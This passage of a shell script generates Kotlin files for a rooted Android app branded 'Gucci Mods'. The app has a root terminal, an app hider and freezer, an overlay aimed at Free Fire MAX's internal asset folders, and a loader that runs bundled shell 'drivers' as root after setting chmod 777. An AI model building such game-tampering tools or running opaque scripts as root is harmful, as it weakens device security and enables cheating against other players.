            val hasShizukuPermission = try { Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED } catch (e: Exception) { false }
            Handler(Looper.getMainLooper()).post {
                if (hasRoot) { activeDialog?.dismiss(); Toast.makeText(this@MainActivity, "Root Access Granted", Toast.LENGTH_SHORT).show() }
                else if (isAdbMode && isShizukuRunning && hasShizukuPermission) { activeDialog?.dismiss(); Toast.makeText(this@MainActivity, "Shizuku Access Active", Toast.LENGTH_SHORT).show() }
                else {
                    if (activeDialog?.isShowing == true) return@post
                    val isShizukuInstalled = try { packageManager.getPackageInfo("moe.shizuku.privileged.api", 0); true } catch (e: Exception) { false }
                    val dialogView = this@MainActivity.layoutInflater.inflate(R.layout.dialog_root, null)
                    val btnShizuku = dialogView.findViewById<Button>(R.id.btnShizuku)
                    if (!isShizukuInstalled) btnShizuku.visibility = android.view.View.GONE
                    activeDialog = AlertDialog.Builder(this@MainActivity).setView(dialogView).setCancelable(false).create()
                    activeDialog?.window?.setBackgroundDrawableResource(android.R.color.transparent)
                    dialogView.findViewById<Button>(R.id.btnGrant).setOnClickListener { activeDialog?.dismiss(); checkAccess() }
                    dialogView.findViewById<Button>(R.id.btnExit).setOnClickListener { activeDialog?.dismiss(); finish() }
                    btnShizuku.setOnClickListener { if (Shizuku.pingBinder()) { if (Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED) { isAdbMode = true; activeDialog?.dismiss(); checkAccess() } else { Shizuku.requestPermission(REQUEST_CODE) } } else { Toast.makeText(this@MainActivity, "Shizuku is NOT running!", Toast.LENGTH_LONG).show() } }
                    activeDialog?.show()
                }
            }
        }.start()
    }
    override fun onDestroy() { Shizuku.removeRequestPermissionResultListener(shizukuListener); super.onDestroy() }
}
EOF

cat > app/src/main/java/com/example/shtile/DriverLoaderActivity.kt << 'EOF'
package com.example.shtile
import android.graphics.Color
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.widget.ArrayAdapter
import android.widget.LinearLayout
import android.widget.Spinner
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import java.io.File
import java.io.FileOutputStream
class DriverLoaderActivity : AppCompatActivity() {
    private lateinit var tvKernel: TextView
    private lateinit var tvArch: TextView
    private lateinit var tvHwid: TextView
    private lateinit var tvLogs: TextView
    private lateinit var btnLoad: MaterialButton
    private lateinit var spinnerDriver: Spinner
    private var fullKernelVersion = "Unknown"
    private var majorKernelVersion = "Unknown"
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_driver_loader)
        tvKernel = findViewById(R.id.tvKernel)
        tvArch = findViewById(R.id.tvArch)
        tvHwid = findViewById(R.id.tvHwid)
        tvLogs = findViewById(R.id.tvLogs)
        btnLoad = findViewById(R.id.btnLoadDriver)
        spinnerDriver = findViewById(R.id.spinnerDriver)

        val availableDrivers = ArrayList<String>()
        try {
            val driverFolders = assets.list("drivers")
            if (driverFolders != null) {
                for (folder in driverFolders) {
                    val filesInFolder = assets.list("drivers/$folder")
                    if (filesInFolder != null && filesInFolder.isNotEmpty()) {
                        availableDrivers.add(folder)
                    }
                }
            }
        } catch (e: Exception) { e.printStackTrace() }

        if (availableDrivers.isEmpty()) { availableDrivers.add("No Drivers Found") }
        
        availableDrivers.sort()
        
        val adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, availableDrivers)
        spinnerDriver.adapter = adapter

        val hwid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        tvHwid.text = "HWID: $hwid"
        detectDeviceInfo()
        
        btnLoad.setOnClickListener { 
            if (spinnerDriver.selectedItem.toString() == "No Drivers Found") {
                Toast.makeText(this, "No drivers available!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            btnLoad.isEnabled = false
            btnLoad.text = "SEARCHING..."
            findAndSelectDriver() 
        }
    }
    
    private fun appendLog(msg: String) { Handler(Looper.getMainLooper()).post { tvLogs.append("$msg\n") } }
    
    private fun detectDeviceInfo() {
        Thread {
            try {
                val kProc = ProcessBuilder("su", "-c", "uname -r").redirectErrorStream(true).start()
                val kOut = kProc.inputStream.bufferedReader().readText().trim(); kProc.waitFor()
                val aProc = ProcessBuilder("su", "-c", "uname -m").redirectErrorStream(true).start()
                val aOut = aProc.inputStream.bufferedReader().readText().trim(); aProc.waitFor()
                fullKernelVersion = kOut
                val parts = kOut.split("-")[0].split(".")
                if (parts.size >= 2) { majorKernelVersion = "${parts[0]}.${parts[1]}" } else { majorKernelVersion = kOut }
                Handler(Looper.getMainLooper()).post {
                    tvKernel.text = "Kernel: $fullKernelVersion"
                    tvArch.text = "Arch: $aOut (Match: $majorKernelVersion)"
                    appendLog("✅ Device Info Detected:")
                    appendLog("   - Full Kernel: $fullKernelVersion")
                    appendLog("   - Major Match: $majorKernelVersion")
                }
            } catch (e: Exception) { Handler(Looper.getMainLooper()).post { tvKernel.text = "Kernel: Error"; appendLog("❌ Failed to read kernel: ${e.message}") } }
        }.start()
    }
    
    private fun findAndSelectDriver() {
        Thread {
            try {
                val selectedFolder = spinnerDriver.selectedItem.toString()
                appendLog("\n[START] Scanning folder: $selectedFolder...")
                val filesInFolder = assets.list("drivers/$selectedFolder")
                
                if (filesInFolder.isNullOrEmpty()) { 
                    appendLog("❌ ERROR: Folder $selectedFolder is empty or missing."); resetButton(); return@Thread 
                }
                
                val matchingFiles = ArrayList<String>()
                for (file in filesInFolder) { 
                    if (file.endsWith(".sh") && (file.startsWith(fullKernelVersion) || file.startsWith(majorKernelVersion))) { matchingFiles.add(file) } 
                }
                
                if (matchingFiles.isEmpty()) { 
                    appendLog("❌ ERROR: No driver found for kernel $majorKernelVersion in $selectedFolder!"); resetButton(); return@Thread 
                }
                
                if (matchingFiles.size == 1) {
                    loadDriverFile(matchingFiles[0], selectedFolder)
                } else {
                    Handler(Looper.getMainLooper()).post {
                        val dialogView = layoutInflater.inflate(R.layout.dialog_select_driver, null)
                        val container = dialogView.findViewById<LinearLayout>(R.id.driverListContainer)
                        val btnCancel = dialogView.findViewById<MaterialButton>(R.id.btnCancelDialog)
                        val dialog = AlertDialog.Builder(this, R.style.AppTheme).setView(dialogView).setCancelable(false).create()
                        
                        for (file in matchingFiles) {
                            val tv = TextView(this)
                            tv.text = file; tv.textSize = 16f; tv.setTextColor(Color.WHITE); tv.gravity = Gravity.CENTER; tv.setPadding(20, 20, 20, 20); tv.background = getDrawable(R.drawable.bg_box_dark)
                            val params = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT); params.setMargins(0, 0, 0, 12); tv.layoutParams = params
                            tv.setOnClickListener { dialog.dismiss(); btnLoad.text = "LOADING $file..."; loadDriverFile(file, selectedFolder) }
                            container.addView(tv)
                        }
                        btnCancel.setOnClickListener { dialog.dismiss(); resetButton() }
                        dialog.show()
                    }
                }
            } catch (e: Exception) { appendLog("❌ CRITICAL ERROR: ${e.message}"); resetButton() }
        }.start()
    }
    
    private fun loadDriverFile(foundFile: String, folder: String) {
        Thread {
            try {
                appendLog("🎯 SELECTED: $foundFile")
                appendLog("📂 Extracting to cache...")
                val cacheFile = File(cacheDir, foundFile)
                assets.open("drivers/$folder/$foundFile").use { input -> FileOutputStream(cacheFile).use { output -> input.copyTo(output) } }
                
                appendLog("🚀 Moving to /data/local/tmp/ with root...")
                val destPath = "/data/local/tmp/$foundFile"
                ProcessBuilder("su", "-c", "cp ${cacheFile.absolutePath} $destPath && chmod 777 $destPath").start().waitFor()
                cacheFile.delete()
                
                appendLog("🔐 Setting Root Permissions...")
                ProcessBuilder("su", "-c", "chmod 777 $destPath").start().waitFor()
                
                appendLog("🚀 Injecting Driver...")
                val runProc = ProcessBuilder("su", "-c", "sh $destPath").redirectErrorStream(true).start()
                val output = runProc.inputStream.bufferedReader().readText().trim()
                val exitCode = runProc.waitFor()
                
                if (exitCode == 0) {
                    appendLog("✅ SUCCESS: Driver loaded successfully!")
                    if (output.isNotEmpty()) appendLog("Output:\n$output")
                    Handler(Looper.getMainLooper()).post { Toast.makeText(this@DriverLoaderActivity, "Driver Loaded Successfully!", Toast.LENGTH_LONG).show(); btnLoad.text = "✅ LOADED" }
                } else { 
                    appendLog("❌ FAILED: Script returned error code $exitCode"); appendLog("Output:\n$output"); resetButton() 
                }
            } catch (e: Exception) { appendLog("❌ CRITICAL ERROR: ${e.message}"); resetButton() }
        }.start()
    }
    
    private fun resetButton() { Handler(Looper.getMainLooper()).post { btnLoad.isEnabled = true; btnLoad.text = "⚡ LOAD SELECTED DRIVER" } }
}
EOF

cat > app/src/main/java/com/example/shtile/TerminalActivity.kt << 'EOF'
package com.example.shtile
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.EditText
import android.widget.RadioGroup
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.button.MaterialButton
import java.io.DataOutputStream
import rikka.shizuku.Shizuku
class TerminalActivity : AppCompatActivity() {
    override fun onCreate(s: Bundle?) {
        super.onCreate(s); setContentView(R.layout.activity_terminal)
        val modeGroup = findViewById<RadioGroup>(R.id.modeGroup); val pkgInput = findViewById<EditText>(R.id.pkgInput)
        val btnHide = findViewById<MaterialButton>(R.id.btnHide); val btnUnhide = findViewById<MaterialButton>(R.id.btnUnhide)
        val btnFreeze = findViewById<MaterialButton>(R.id.btnFreeze); val btnDeepFreeze = findViewById<MaterialButton>(R.id.btnDeepFreeze)
        val btnUnfreeze = findViewById<MaterialButton>(R.id.btnUnfreeze); val btnDelete = findViewById<MaterialButton>(R.id.btnDelete)
        val terminalInput = findViewById<EditText>(R.id.terminalInput); val btnRunCmd = findViewById<MaterialButton>(R.id.btnRunCmd); val terminalOutput = findViewById<TextView>(R.id.terminalOutput)
        btnHide.setOnClickListener { val pkg = pkgInput.text.toString().trim(); if (pkg.isNotEmpty()) { terminalOutput.text = "Hiding $pkg...\n"; executeCommand("pm hide $pkg; pm disable-user --user 0 $pkg", modeGroup, terminalOutput) } else { Toast.makeText(this@TerminalActivity, "Enter package name", Toast.LENGTH_SHORT).show() } }
        btnUnhide.setOnClickListener { val pkg = pkgInput.text.toString().trim(); if (pkg.isNotEmpty()) { terminalOutput.text = "Unhiding $pkg...\n"; executeCommand("pm unhide $pkg; pm enable $pkg; pm unsuspend $pkg; cmd package install-existing --user 0 $pkg", modeGroup, terminalOutput) } else { Toast.makeText(this@TerminalActivity, "Enter package name", Toast.LENGTH_SHORT).show() } }
        btnFreeze.setOnClickListener { val pkg = pkgInput.text.toString().trim(); if (pkg.isNotEmpty()) { terminalOutput.text = "Freezing $pkg...\n"; executeCommand("am force-stop $pkg; pm suspend $pkg", modeGroup, terminalOutput) } else { Toast.makeText(this@TerminalActivity, "Enter package name", Toast.LENGTH_SHORT).show() } }
        btnDeepFreeze.setOnClickListener { val pkg = pkgInput.text.toString().trim(); if (pkg.isNotEmpty()) { terminalOutput.text = "Deep Freezing $pkg...\n"; executeCommand("am force-stop $pkg; pm suspend $pkg; pm disable-user --user 0 $pkg; pm hide $pkg", modeGroup, terminalOutput) } else { Toast.makeText(this@TerminalActivity, "Enter package name", Toast.LENGTH_SHORT).show() } }
        btnUnfreeze.setOnClickListener { val pkg = pkgInput.text.toString().trim(); if (pkg.isNotEmpty()) { terminalOutput.text = "Unfreezing $pkg...\n"; executeCommand("pm unsuspend $pkg; pm enable $pkg; pm unhide $pkg", modeGroup, terminalOutput) } else { Toast.makeText(this@TerminalActivity, "Enter package name", Toast.LENGTH_SHORT).show() } }
        btnDelete.setOnClickListener { val pkg = pkgInput.text.toString().trim(); if (pkg.isNotEmpty()) { terminalOutput.text = "Deleting $pkg...\n"; executeCommand("pm uninstall --user 0 $pkg", modeGroup, terminalOutput) } else { Toast.makeText(this@TerminalActivity, "Enter package name", Toast.LENGTH_SHORT).show() } }
        btnRunCmd.setOnClickListener { val cmd = terminalInput.text.toString().trim(); if (cmd.isNotEmpty()) { terminalOutput.append("Running: $cmd\n\n"); executeCommand(cmd, modeGroup, terminalOutput); terminalInput.text.clear() } }
    }
    private fun executeCommand(cmd: String, modeGroup: RadioGroup, outputView: TextView) {
        Thread {
            try {
                val isRootMode = modeGroup.checkedRadioButtonId == R.id.radioRoot
                val process: Process? = if (isRootMode) { Runtime.getRuntime().exec("su") } else {
                    try { val method = Shizuku::class.java.getDeclaredMethod("newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java); method.isAccessible = true; method.invoke(null, arrayOf("sh", "-c", cmd), null, null) as Process } catch (e: Exception) { Handler(Looper.getMainLooper()).post { outputView.append("Shizuku Error: ${e.message}\n") }; return@Thread }
                }
                if (isRootMode && process != null) { val os = DataOutputStream(process.outputStream); os.writeBytes("$cmd\n"); os.writeBytes("exit\n"); os.flush(); os.close() }
                if (process != null) {
                    val reader = process.inputStream.bufferedReader(); val output = StringBuilder(); var line: String?
                    while (reader.readLine().also { line = it } != null) { output.append(line).append("\n") }
                    val errorReader = process.errorStream.bufferedReader(); while (errorReader.readLine().also { line = it } != null) { output.append(line).append("\n") }
                    process.waitFor()
                    Handler(Looper.getMainLooper()).post { if (output.isEmpty()) outputView.append("Done (No output)\n\n") else outputView.append(output.toString() + "\n"); val scrollView = outputView.parent as ScrollView; scrollView.post { scrollView.fullScroll(ScrollView.FOCUS_DOWN) } }
                }
            } catch (e: Exception) { Handler(Looper.getMainLooper()).post { outputView.append("Error: ${e.message}\n\n") } }
        }.start()
    }
}
EOF

cat > app/src/main/java/com/example/shtile/HideAppsActivity.kt << 'EOF'
package com.example.shtile
import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.Drawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.View
import android.widget.*
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import java.io.DataOutputStream
import com.google.android.material.materialswitch.MaterialSwitch
import com.google.android.material.checkbox.MaterialCheckBox
import com.google.android.material.button.MaterialButton
import com.google.android.material.tabs.TabLayout
data class AppItem(val name: String, val pkg: String, val icon: Drawable?, var isChecked: Boolean, var isHidden: Boolean, var isFrozen: Boolean, var isDeepFrozen: Boolean, val safetyLevel: Int)
class HideAppsActivity : AppCompatActivity() {
    private val appList = ArrayList<AppItem>(); private var adapterAll: AppAdapter? = null; private var adapterHidden: AppAdapter? = null; private val prefs by lazy { getSharedPreferences("HidePrefs", MODE_PRIVATE) }; private var showSystemApps = false
    private val criticalApps = setOf("android", "com.android.systemui", "com.android.settings", "com.android.phone", "com.android.shell", "com.android.providers.settings", "com.android.packageinstaller", "com.google.android.packageinstaller", "com.android.vending", "com.google.android.gms", "com.google.android.gsf", "com.android.launcher3", "com.google.android.apps.nexuslauncher")
    override fun onCreate(s: Bundle?) {
        super.onCreate(s); setContentView(R.layout.activity_hide_apps)
        val tabLayout = findViewById<TabLayout>(R.id.tabLayout); val pageAllApps = findViewById<View>(R.id.pageAllApps); val pageHiddenApps = findViewById<View>(R.id.pageHiddenApps); val search = findViewById<EditText>(R.id.searchInput); val applyBtn = findViewById<MaterialButton>(R.id.applyBtn); val emergencyBtn = findViewById<MaterialButton>(R.id.emergencyBtn); val timerSpinner = findViewById<Spinner>(R.id.timerSpinner); val showSystemSwitch = findViewById<MaterialSwitch>(R.id.showSystemSwitch)
        val timerOptions = arrayOf("Disabled", "5 Minutes", "15 Minutes", "30 Minutes", "1 Hour", "2 Hours"); val timerValues = arrayOf(0, 5, 15, 30, 60, 120)
        timerSpinner.adapter = ArrayAdapter(this, android.R.layout.simple_spinner_dropdown_item, timerOptions); timerSpinner.setSelection(timerValues.indexOf(prefs.getInt("timer_minutes", 0)).coerceAtLeast(0))
        showSystemSwitch.setOnCheckedChangeListener { _, isChecked -> showSystemApps = isChecked; loadApps() }
        loadApps()
        tabLayout.addOnTabSelectedListener(object : TabLayout.OnTabSelectedListener { override fun onTabSelected(tab: TabLayout.Tab?) { pageAllApps.visibility = if (tab?.position == 0) View.VISIBLE else View.GONE; pageHiddenApps.visibility = if (tab?.position == 1) View.VISIBLE else View.GONE; applyBtn.visibility = if (tab?.position == 0) View.VISIBLE else View.GONE }; override fun onTabUnselected(tab: TabLayout.Tab?) {}; override fun onTabReselected(tab: TabLayout.Tab?) {} })
        search.addTextChangedListener(object : android.text.TextWatcher { override fun beforeTextChanged(s: CharSequence?, st: Int, c: Int, a: Int) {}; override fun onTextChanged(s: CharSequence?, st: Int, b: Int, c: Int) { adapterAll?.filter(s) }; override fun afterTextChanged(s: android.text.Editable?) {} })
        applyBtn.setOnClickListener { val selectedPkgs = HashSet<String>(); for (item in appList) { if (item.isChecked) selectedPkgs.add(item.pkg) }; val selectedMinutes = timerValues[timerSpinner.selectedItemPosition]; prefs.edit().putStringSet("safe_apps", selectedPkgs).putInt("timer_minutes", selectedMinutes).apply(); Toast.makeText(this@HideAppsActivity, "Saved! Timer: ${timerOptions[timerSpinner.selectedItemPosition]}", Toast.LENGTH_SHORT).show() }
        emergencyBtn.setOnClickListener { Toast.makeText(this@HideAppsActivity, "Emergency Restoring ALL Apps...", Toast.LENGTH_SHORT).show(); Thread { try { val hidden = prefs.getStringSet("hidden_history", emptySet()) ?: emptySet(); val frozen = prefs.getStringSet("frozen_history", emptySet()) ?: emptySet(); val deepFrozen = prefs.getStringSet("deep_frozen_history", emptySet()) ?: emptySet(); val safe = prefs.getStringSet("safe_apps", emptySet()) ?: emptySet(); val allApps = hidden + frozen + deepFrozen + safe; if (allApps.isEmpty()) return@Thread; val cmd = StringBuilder(); for (pkg in allApps) { cmd.append("pm unhide $pkg; pm enable $pkg; pm unsuspend $pkg; cmd package install-existing --user 0 $pkg; ") }; val p = Runtime.getRuntime().exec("su"); val os = DataOutputStream(p.outputStream); os.writeBytes(cmd.toString() + "\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor(); prefs.edit().remove("hidden_history").remove("frozen_history").remove("deep_frozen_history").putBoolean("is_pay_hidden", false).apply(); Handler(Looper.getMainLooper()).post { Toast.makeText(this@HideAppsActivity, "All Apps Restored!", Toast.LENGTH_LONG).show(); loadApps() } } catch (e: Exception) {} }.start() }
    }
    private fun loadApps() {
        Thread {
            val pm = packageManager; appList.clear(); val safePkgs = prefs.getStringSet("safe_apps", emptySet()) ?: emptySet(); val hiddenHistory = prefs.getStringSet("hidden_history", emptySet()) ?: emptySet(); val frozenHistory = prefs.getStringSet("frozen_history", emptySet()) ?: emptySet(); val deepFrozenHistory = prefs.getStringSet("deep_frozen_history", emptySet()) ?: emptySet()
            val disabledPkgs = HashSet<String>()
            try { val p = Runtime.getRuntime().exec("su -c pm list packages -d -u"); val reader = p.inputStream.bufferedReader(); var line = reader.readLine(); while (line != null) { disabledPkgs.add(line.replace("package:", "").trim()); line = reader.readLine() } } catch (e: Exception) {}
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            for (app in apps) { if (app.packageName == packageName) continue; val isSystem = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0; val isHidden = hiddenHistory.contains(app.packageName) || disabledPkgs.contains(app.packageName); val isFrozen = frozenHistory.contains(app.packageName); val isDeepFrozen = deepFrozenHistory.contains(app.packageName); if (showSystemApps || !isSystem || isHidden || isFrozen || isDeepFrozen) { try { val name = pm.getApplicationLabel(app).toString(); val isChecked = safePkgs.contains(app.packageName); val safety = when { criticalApps.contains(app.packageName) -> 2; isSystem -> 1; else -> 0 }; appList.add(AppItem(name, app.packageName, app.loadIcon(pm), isChecked, isHidden, isFrozen, isDeepFrozen, safety)) } catch (e: Exception) {} } }
            val allHistory = hiddenHistory + frozenHistory + deepFrozenHistory
            for (pkg in allHistory) { if (appList.none { it.pkg == pkg }) { val safety = if (criticalApps.contains(pkg)) 2 else if (pkg.startsWith("com.android") || pkg.startsWith("com.google")) 1 else 0; appList.add(AppItem("Unknown App", pkg, null, safePkgs.contains(pkg), hiddenHistory.contains(pkg), frozenHistory.contains(pkg), deepFrozenHistory.contains(pkg), safety)) } }
            Handler(Looper.getMainLooper()).post { adapterAll = AppAdapter(this@HideAppsActivity, appList, false); findViewById<ListView>(R.id.appsList).adapter = adapterAll; adapterHidden = AppAdapter(this@HideAppsActivity, appList, true); findViewById<ListView>(R.id.hiddenAppsList).adapter = adapterHidden; adapterAll?.filter(""); adapterHidden?.filter("") }
        }.start()
    }
    private fun showAppOptions(item: AppItem) {
        val options = arrayOf("Hide (pm hide)", "Unhide (Restore)", "Freeze (Suspend)", "Unfreeze (Unsuspend)", "Deep Freeze (Disable)", "Delete (Uninstall)")
        AlertDialog.Builder(this).setTitle(item.name).setItems(options) { _, which ->
            if (which == 5 && item.safetyLevel == 2) {
                AlertDialog.Builder(this).setTitle("⚠️ CRITICAL SYSTEM APP").setMessage("WARNING: ${item.name} is a core system app!\n\nDeleting this WILL break your device and may cause a bootloop.\n\nAre you absolutely sure?").setPositiveButton("DELETE ANYWAY") { _, _ -> executeAction("pm uninstall --user 0 ${item.pkg}", which, item) }.setNegativeButton("CANCEL", null).show()
            } else {
                val cmd = when (which) { 0 -> "pm hide ${item.pkg}; pm disable-user --user 0 ${item.pkg}"; 1 -> "pm unhide ${item.pkg}; pm enable ${item.pkg}; pm unsuspend ${item.pkg}; cmd package install-existing --user 0 ${item.pkg}"; 2 -> "am force-stop ${item.pkg}; pm suspend ${item.pkg}"; 3 -> "pm unsuspend ${item.pkg}; pm enable ${item.pkg}"; 4 -> "am force-stop ${item.pkg}; pm suspend ${item.pkg}; pm disable-user --user 0 ${item.pkg}; pm hide ${item.pkg}"; 5 -> "pm uninstall --user 0 ${item.pkg}"; else -> "" }
                executeAction(cmd, which, item)
            }
        }.show()
    }
    private fun executeAction(cmd: String, actionType: Int, item: AppItem) {
        Thread {
            try {
                val p = Runtime.getRuntime().exec("su")
                val os = DataOutputStream(p.outputStream)
                os.writeBytes("$cmd\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor()
                val hidden = prefs.getStringSet("hidden_history", emptySet())?.toMutableSet() ?: mutableSetOf()
                val frozen = prefs.getStringSet("frozen_history", emptySet())?.toMutableSet() ?: mutableSetOf()
                val deepFrozen = prefs.getStringSet("deep_frozen_history", emptySet())?.toMutableSet() ?: mutableSetOf()
                when (actionType) { 0 -> { hidden.add(item.pkg); item.isHidden = true }; 1 -> { hidden.remove(item.pkg); item.isHidden = false }; 2 -> { frozen.add(item.pkg); item.isFrozen = true }; 3 -> { frozen.remove(item.pkg); item.isFrozen = false }; 4 -> { deepFrozen.add(item.pkg); item.isDeepFrozen = true }; 5 -> { hidden.remove(item.pkg); frozen.remove(item.pkg); deepFrozen.remove(item.pkg) } }
                prefs.edit().putStringSet("hidden_history", hidden).putStringSet("frozen_history", frozen).putStringSet("deep_frozen_history", deepFrozen).apply()
                Handler(Looper.getMainLooper()).post { Toast.makeText(this@HideAppsActivity, "Action Completed", Toast.LENGTH_SHORT).show(); loadApps() }
            } catch (e: Exception) { Handler(Looper.getMainLooper()).post { Toast.makeText(this@HideAppsActivity, "Failed: ${e.message}", Toast.LENGTH_SHORT).show() } }
        }.start()
    }
    private inner class AppAdapter(private val context: Context, private val items: List<AppItem>, private val showHiddenOnly: Boolean) : android.widget.BaseAdapter() {
        private val inflater = android.view.LayoutInflater.from(context); private var filteredItems = ArrayList<AppItem>()
        override fun getCount(): Int = filteredItems.size; override fun getItem(position: Int): Any = filteredItems[position]; override fun getItemId(position: Int): Long = position.toLong()
        override fun getView(position: Int, convertView: android.view.View?, parent: android.view.ViewGroup): android.view.View {
            val v = convertView ?: inflater.inflate(R.layout.list_item_app, parent, false); val item = filteredItems[position]
            var status = ""
            if (item.isDeepFrozen) status = " [DEEP FREEZE]" else if (item.isHidden) status = " [HIDDEN]" else if (item.isFrozen) status = " [FROZEN]"
            val textView = v.findViewById<TextView>(R.id.appName)
            textView.text = "${item.name}$status"
            if (item.isDeepFrozen) textView.setTextColor(Color.parseColor("#9B59B6")) else if (item.isHidden) textView.setTextColor(Color.parseColor("#FF4D4D")) else if (item.isFrozen) textView.setTextColor(Color.parseColor("#F39C12")) else textView.setTextColor(Color.WHITE)
            val dot = v.findViewById<View>(R.id.safetyDot)
            when (item.safetyLevel) { 2 -> dot.setBackgroundColor(Color.parseColor("#FF4D4D")); 1 -> dot.setBackgroundColor(Color.parseColor("#9B59B6")); else -> dot.setBackgroundColor(Color.parseColor("#00E5A0")) }
            v.findViewById<TextView>(R.id.appPkg).text = item.pkg
            val iconView = v.findViewById<ImageView>(R.id.appIcon)
            if (item.icon != null) iconView.setImageDrawable(item.icon) else iconView.setImageResource(android.R.drawable.ic_menu_help)
            val cb = v.findViewById<MaterialCheckBox>(R.id.appCheck)
            cb.setOnCheckedChangeListener(null); cb.isChecked = item.isChecked
            cb.setOnCheckedChangeListener { _, isChecked -> item.isChecked = isChecked; filter("") }
            val btnOptions = v.findViewById<MaterialButton>(R.id.btnOptions)
            btnOptions.setOnClickListener { showAppOptions(item) }
            return v
        }
        fun filter(charSequence: CharSequence?) { 
            val query = charSequence?.toString()?.lowercase() ?: ""
            var baseList = if (query.isEmpty()) items else items.filter { it.name.lowercase().contains(query) || it.pkg.lowercase().contains(query) }
            if (showHiddenOnly) baseList = baseList.filter { it.isHidden || it.isFrozen || it.isDeepFrozen }
            filteredItems = ArrayList(baseList.sortedWith(compareByDescending<AppItem> { it.isHidden || it.isFrozen || it.isDeepFrozen }.thenBy { it.name }))
            notifyDataSetChanged() 
        }
    }
}
EOF

cat > app/src/main/java/com/example/shtile/FloaterOverlayService.kt << 'EOF'
package com.example.shtile
import android.app.*
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.view.Gravity
import android.view.LayoutInflater
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.widget.ImageButton
import android.widget.Toast
import androidx.appcompat.view.ContextThemeWrapper
import com.google.android.material.materialswitch.MaterialSwitch
import java.io.File
class FloaterOverlayService : Service() {
    private val floater1OnAsset = "Gucci_Ch"; private val floater1OffAsset = "Gucci_O"
    private val floater2OnAsset = "Gucci_h"; private val floater2OffAsset = "Gucci_O"
    private val floater3OnAsset = "Gucci_G"; private val floater3OffAsset = "Gucci_GO"
    private val floater4OnAsset = "Gucci_CHS"; private val floater5OnAsset = "Gucci_B"
    private val floater6OnAsset = "Gucci_M"; private val floater7OnAsset = "Gucci_L"
    private val glooTargetDir = "/storage/emulated/0/Android/data/com.dts.freefiremax/files/contentcache/Optional/android/"
    private val compulsoryDir = "/data/user/0/com.dts.freefiremax/files/contentcache/Compulsory/android/gameassetbundles/"
    private val avatarDir = "/data/user/0/com.dts.freefiremax/files/contentcache/Compulsory/android/gameassetbundles/avatar/"
    private val filesDir = "/data/user/0/com.dts.freefiremax/files/"
    private val cacheResName = "cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
    private val pdcacheName = "split_asset_pack_install_time.apk.pdcache"
    private val assetIndexerName = "assetindexer.U0jVgfPVdG5YZ2HvIuO5tFkQcCM~3D"
    private lateinit var wm: WindowManager; private var panel: View? = null; private var bubble: View? = null
    private val prefs by lazy { getSharedPreferences("FloaterPrefs", MODE_PRIVATE) }
    override fun onBind(intent: Intent?): IBinder? = null
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!Settings.canDrawOverlays(this)) { stopSelf(); return START_NOT_STICKY }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel("floater_ch", "Floater", NotificationManager.IMPORTANCE_MIN); channel.setShowBadge(false); channel.setSound(null, null); nm.createNotificationChannel(channel)
            val notification = Notification.Builder(this, "floater_ch").setContentTitle("Gucci Mods").setSmallIcon(android.R.drawable.ic_menu_view).build()
            startForeground(1, notification)
        }
        if (panel == null && bubble == null) { try { showPanel() } catch (e: Exception) { Toast.makeText(this, "Draw Error: ${e.message}", Toast.LENGTH_LONG).show() } }
        return START_REDELIVER_INTENT
    }
    private fun overlayParams(w: Int, h: Int) = WindowManager.LayoutParams(w, h, if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE, WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, PixelFormat.TRANSLUCENT).apply { gravity = Gravity.TOP or Gravity.START; x = 100; y = 200 }
    private fun showPanel() {
        wm = getSystemService(WINDOW_SERVICE) as WindowManager
        val themedContext = ContextThemeWrapper(this, R.style.AppTheme)
        val v = LayoutInflater.from(themedContext).inflate(R.layout.overlay_floater, null)
        val params = overlayParams(WindowManager.LayoutParams.WRAP_CONTENT, WindowManager.LayoutParams.WRAP_CONTENT)
        setupDrag(v.findViewById(R.id.dragHandleTop), v, params); setupDrag(v.findViewById(R.id.dragHandleBottom), v, params)
        v.findViewById<ImageButton>(R.id.btnMinimize).setOnClickListener { minimize() }; v.findViewById<ImageButton>(R.id.btnClose).setOnClickListener { close() }
        
        val sw1 = v.findViewById<MaterialSwitch>(R.id.switchFloater1); val sw2 = v.findViewById<MaterialSwitch>(R.id.switchFloater2)
        val sw3 = v.findViewById<MaterialSwitch>(R.id.switchFloater3); val sw4 = v.findViewById<MaterialSwitch>(R.id.switchFloater4)
        val sw5 = v.findViewById<MaterialSwitch>(R.id.switchFloater5); val sw6 = v.findViewById<MaterialSwitch>(R.id.switchFloater6)
